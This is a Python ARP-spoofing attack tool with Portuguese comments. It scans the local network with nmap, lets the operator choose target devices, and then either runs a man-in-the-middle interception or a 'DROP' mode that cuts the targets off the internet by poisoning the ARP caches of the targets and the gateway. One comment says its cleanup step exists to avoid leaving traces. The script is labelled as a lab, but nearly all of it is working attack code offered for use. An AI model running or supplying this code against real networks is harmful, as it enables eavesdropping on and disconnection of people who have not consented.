import subprocess
import re
import json
import os
import sys
import time
from threading import Thread
from scapy.all import ARP, send, getmacbyip


print("""
     .... NO! ...                  ... MNO! ...
   ..... MNO!! ...................... MNNOO! ...
 ..... MMNO! ......................... MNNOO!! .
.... MNOONNOO!   MMMMMMMMMMPPPOII!   MNNO!!!! .
 ... !O! NNO! MMMMMMMMMMMMMPPPOOOII!! NO! ....
    ...... ! MMMMMMMMMMMMMPPPPOOOOIII! ! ...
   ........ MMMMMMMMMMMMPPPPPOOOOOOII!! .....
   ........ MMMMMOOOOOOPPPPPPPPOOOOMII! ...
    ....... MMMMM..    OPPMMP    .,OMI! ....
     ...... MMMM::   o.,OPMP,.o   ::I!! ...
         .... NNM:::.,,OOPM!P,.::::!! ....
          .. MMNNNNNOOOOPMO!!IIPPO!!O! .....
         ... MMMMMNNNNOO:!!:!!IPPPPOO! ....
           .. MMMMMNNOOMMNNIIIPPPOO!! ......
          ...... MMMONNMMNNNIIIOO!..........
       ....... MN MOMMMNNNIIIIIO! OO ..........
    ......... MNO! IiiiiiiiiiiiI OOOO ...........
  ...... NNN.MNO! . O!!!!!!!!!O . OONO NO! ........
   .... MNNNNNO! ...OOOOOOOOOOO .  MMNNON!........
   ...... MNNNNO! .. PPPPPPPPP .. MMNON!........
      ...... OO! ................. ON! .......
         ................................
    .___               __                               .__        
  __| _/____   _______/  |___  _  _______ ______________|__| ____  
 / __ |/ __ \ /  ___/\   __\ \/ \/ /\__  \\_  __ \_  __ \  |/  _ \ 
/ /_/ \  ___/ \___ \  |  |  \     /  / __ \|  | \/|  | \/  (  <_> )
\____ |\___  >____  > |__|   \/\_/  (____  /__|   |__|  |__|\____/ 
     \/    \/     \/                     \/                        


""")




# ============================================================
# RECONHECIMENTO DA REDE (Mantido conforme seu original)
# ============================================================

def recon(modo="normal"):
    resultado = subprocess.run(["ip", "route"], capture_output=True, text=True)
    rota = resultado.stdout
    gateway_match = re.search(r"default via ([0-9.]+) dev (\S+)", rota)
    rede_match = re.search(r"([0-9.]+/\d+) dev (\S+).*src ([0-9.]+)", rota)
    gateway = gateway_match.group(1) if gateway_match else None
    interface = gateway_match.group(2) if gateway_match else None
    rede = rede_match.group(1) if rede_match else None
    ip = rede_match.group(3) if rede_match else None

    mac = None
    if interface:
        resultado_mac = subprocess.run(["ip", "link", "show", interface], capture_output=True, text=True)
        mac_match = re.search(r"link/ether ([0-9a-fA-F:]+)", resultado_mac.stdout)
        if mac_match:
            mac = mac_match.group(1).lower()

    hosts = []
    if rede:
        comando = ["nmap", "-sn"]
        if modo == "agressivo":
            comando.append("-PR")
        comando.append(rede)
        resultado_hosts = subprocess.run(comando, capture_output=True, text=True)
        saida = resultado_hosts.stdout
        blocos = re.split(r"(?=Nmap scan report for )", saida)
        for bloco in blocos:
            ip_match = re.search(r"Nmap scan report for (?:[^\s(]+\s+\()?([0-9.]+)\)?", bloco)
            mac_match = re.search(r"MAC Address:\s*([0-9A-Fa-f:]+)", bloco)
            if ip_match:
                hosts.append({"ip": ip_match.group(1), "mac": (mac_match.group(1).lower() if mac_match else None)})

    return {"interface": interface, "ip": ip, "mac": mac, "rede": rede, "gateway": gateway, "modo": modo, "hosts": hosts}

def selecionar_alvos(dados):
    hosts = dados["hosts"]
    if not hosts:
        print("\nNenhum dispositivo encontrado.")
        return []
    print("\n================================")
    print("       DISPOSITIVOS")
    print("================================")
    for numero, host in enumerate(hosts, start=1):
        print(f"[{numero}] IP: {host['ip']} | MAC: {host['mac']}")
    print("\n[A] Selecionar todos")
    print("[0] Voltar")
    while True:
        escolha = input("\nEscolha: ").strip().lower()
        if escolha == "0": return []
        if escolha == "a": return hosts.copy()
        try:
            numero = int(escolha)
            if 1 <= numero <= len(hosts): return [hosts[numero - 1]]
        except ValueError: pass
        print("Opção inválida.")

# ============================================================
# MECANISMO DE ARP SPOOFING (O Coração do Ataque)
# ============================================================

def spoof(target_ip, host_ip, target_mac):
    """
    Envia pacotes ARP falsos para convencer o alvo de que nós somos o gateway.
    """
    # op=2 significa ARP Response (Resposta)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=host_ip)
    send(packet, verbose=False)

def restore(destination_ip, source_ip, destination_mac):
    """
    Restaura a tabela ARP original para não deixar rastros e devolver a internet.
    """
    packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip)
    send(packet, count=4, verbose=False)

# ============================================================
# ETAPA 2 — MITM (Repassa o tráfego)
# ============================================================

def mitm(dados, alvos):
    print("\n[!] Iniciando MITM... Ativando IP Forwarding.")
    # Ativa o encaminhamento de pacotes no Kernel do Linux
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    
    try:
        while True:
            for alvo in alvos:
                # Engana o Alvo: "Eu sou o Gateway"
                spoof(alvo['ip'], dados['gateway'], alvo['mac'])
                # Engana o Gateway: "Eu sou o Alvo"
                spoof(dados['gateway'], alvo['ip'], dados['mac'])
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] Parando MITM e restaurando rede...")
        for alvo in alvos:
            restore(alvo['ip'], dados['gateway'], alvo['mac'])
            restore(dados['gateway'], alvo['ip'], dados['mac'])
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

# ============================================================
# ETAPA 3 — DROP (Derruba a conexão)
# ============================================================

def drop(dados, alvos):
    print("\n[!] Iniciando DROP... Desativando IP Forwarding.")
    # DESATIVA o encaminhamento. O tráfego chega em você e morre aqui.
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    
    try:
        while True:
            for alvo in alvos:
                # O alvo acha que você é o gateway, mas você não repassa nada.
                # Isso causa a queda imediata da internet no dispositivo.
                spoof(alvo['ip'], dados['gateway'], alvo['mac'])
                # Opcional: spoof no gateway também para garantir o isolamento
                spoof(dados['gateway'], alvo['ip'], dados['mac'])
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] Revertendo DROP e restaurando rede...")
        for alvo in alvos:
            restore(alvo['ip'], dados['gateway'], alvo['mac'])
            restore(dados['gateway'], alvo['ip'], dados['mac'])

# ============================================================
# MENU ATUALIZADO
# ============================================================

def menu():
    while True:
        print("\n================================")
        print("          REDE LAB")
        print("================================")
        print("[1] Recon normal")
        print("[2] Recon agressiva")
        print("[3] Sair")
        print("================================")
        opcao = input("Escolha: ").strip()
        if opcao == "3": break
        if opcao not in ["1", "2"]: continue

        dados = recon("normal" if opcao == "1" else "agressivo")
        print(f"\nInterface: {dados['interface']} | Gateway: {dados['gateway']} | Hosts: {len(dados['hosts'])}")
        
        alvos = selecionar_alvos(dados)
        if not alvos: continue

        print("\nO que deseja fazer com os alvos?")
        print("[1] MITM (Espionar/Repassar)")
        print("[2] DROP (Derrubar Conexão)")
        print("[0] Voltar")
        
        acao = input("Escolha: ").strip()
        if acao == "1":
            mitm(dados, alvos)
        elif acao == "2":
            drop(dados, alvos)

if __name__ == "__main__":
    # O script precisa de privilégios de root para manipular pacotes e o kernel
    if os.geteuid() != 0:
        print("Erro: Este script deve ser executado como ROOT (sudo).")
        sys.exit(1)
    menu()
